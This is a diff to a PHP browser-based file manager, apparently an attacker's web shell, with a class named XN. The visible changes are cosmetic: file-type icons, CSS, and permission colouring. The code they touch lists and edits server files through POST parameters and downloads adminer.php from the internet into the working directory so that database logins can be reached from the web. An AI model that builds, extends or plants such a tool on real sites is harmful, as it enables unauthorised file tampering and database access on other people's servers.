@@ -49,9 +49,16 @@ class XN {
             } return round($filesize, 2) . " " . $array[$total];
         }
     }
-    public static function wr($filename, $perms) {
+    public static function wr($filename, $perms, $type) {
         if (is_writable($filename)) {
-            print "<font color='green'>{$perms}</font>";
+            switch ($type) {
+            	case 1:
+            		print "<font color='#000'>{$perms}</font>";
+            		break;
+            	case 2:
+            		print "<font color='green'>{$perms}</font>";
+            		break;
+            }
         } else {
             print "<font color='red'>{$perms}</font>";
         }
@@ -146,6 +153,15 @@ class XN {
     		case 'rar':
     			self::vers('https://image.flaticon.com/icons/svg/2306/2306170.svg');
     			break;
+    		case 'htaccess':
+    			self::vers('https://image.flaticon.com/icons/png/128/1720/1720444.png');
+    			break;
+    		case 'txt':
+    			self::vers('https://image.flaticon.com/icons/svg/136/136538.svg');
+    			break;
+    		case 'ini':
+    			self::vers('https://image.flaticon.com/icons/svg/1126/1126890.svg');
+    			break;
     		case 'mp3':
     			self::vers('https://image.flaticon.com/icons/svg/337/337944.svg');
     			break;
@@ -153,7 +169,18 @@ class XN {
     			self::vers('https://image.flaticon.com/icons/svg/2306/2306142.svg');
     			break;
     		case 'log':
+    		case 'log1':
+    		case 'log2':
     			self::vers('https://image.flaticon.com/icons/svg/2306/2306124.svg');
+    			break;
+    		case 'dat':
+    			self::vers('https://image.flaticon.com/icons/svg/2306/2306050.svg');
+    			break;
+    		case 'exe':
+    			self::vers('https://image.flaticon.com/icons/svg/136/136531.svg');
+    			break;
+    		case 'apk':
+    			self::vers('https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg');
     			break;
     		case 'ico':
     			self::vers('https://image.flaticon.com/icons/svg/1126/1126873.svg');
@@ -569,7 +596,7 @@ function head($x, $y, $class = null) {
             <i class="fa fa-arrow-left" aria-hidden="true"></i>
         </a>
         <div class="dirname">
-            <?= $x ?>
+            <?= XN::wr(getcwd(), $x, 1) ?>
         </div>
         <button class="dropdown-toggle toggle" title="Menu">
             <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
@@ -787,7 +814,7 @@ function alert($message) {
     .back .dirname {
         position: absolute;
         margin-top:-7px;
-        max-width:530px;
+        max-width:510px;
         display: inline-block;
         margin-left: 20px;
         font-size: 23px;
@@ -846,9 +873,27 @@ function alert($message) {
         overflow: auto;
     }
     .adminer {
+    	text-align: center;
     	padding-left: 25px;
         padding-right: 25px;
         display: block;
+    }
+    .adminer span {
+    	font-size:20px;
+    }
+    .adminer a {
+    	background: #53c41b;
+    	padding:10px;
+    	padding-left:50px;
+    	padding-right: 50px;
+    	border-radius:7px;
+    	color: #fff;
+    }
+    .edit .editname {
+    	width:500px;
+    	overflow: hidden;
+    	white-space: nowrap;
+        text-overflow: ellipsis;
     }
     .config,
     .rewrite,
@@ -947,7 +992,7 @@ function alert($message) {
     }
     .block .name {
         display: inline-block;
-        max-width:525px;
+        max-width:480px;
         overflow: hidden;
         white-space: nowrap;
         text-overflow: ellipsis;
@@ -1425,14 +1470,18 @@ function filterTable() {
         case 'adminer':
         	head('Adminer', getcwd(), 'hidden');
         	if (file_exists('adminer.php')) {
-        		?> <a href="adminer.php" target="_blank">Login Adminer</a> <?php
+        		?>
+        		<div class="adminer">
+        			<a href="adminer.php" target="_blank">Login Adminer</a>
+        		</div>
+        		<?php
         	} else {
         		if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php', 'adminer.php')) {
         			?>
         			<div class="adminer">
         				<span>
         					Successfully created Adminer.php
-        				</span>
+        				</span><br><br>
         				<a href="adminer.php" target="_blank">Login Adminer</a>
         			</div>
         			<?php
@@ -1644,7 +1693,7 @@ function filterTable() {
                         <td>:</td>
                         <td>
                             <?= XN::wr(basename($_POST['file']), 
-                                XN::editname(basename($_POST['file']), 55)) ?>
+                                XN::editname(basename($_POST['file']), 55), 2) ?>
                         </td>
                     </tr>
                     <tr>
@@ -1747,8 +1796,9 @@ function filterTable() {
                         </td>
                         <td>:</td>
                         <td>
-                            <?= XN::wr(basename($_POST['file']), 
-                                XN::editname(basename($_POST['file']), 55)) ?>
+                            <div class="editname">
+                            	<?= XN::wr(basename($_POST['file']), basename($_POST['file']), 2) ?>
+                            </div>
                         </td>
                     </tr>
                     <tr>
@@ -1828,7 +1878,7 @@ function filterTable() {
                                     </div>
                                     <div class="dir-perms">
                                         <?= XN::wr($dir['name'], 
-                                        XN::perms($dir['name'])) ?>
+                                        XN::perms($dir['name']), 2) ?>
                                     </div>
                                     <div class="dir-time">
                                         <?= $dir['ftime'] ?>
@@ -1882,7 +1932,7 @@ function filterTable() {
                                     </div>
                                     <div class="file-perms">
                                         <?= XN::wr($file['name'], 
-                                        XN::perms($file['name'])) ?>
+                                        XN::perms($file['name']), 2) ?>
                                     </div>
                                     <div class="file-time">
                                         <?= $file['ftime'] ?>
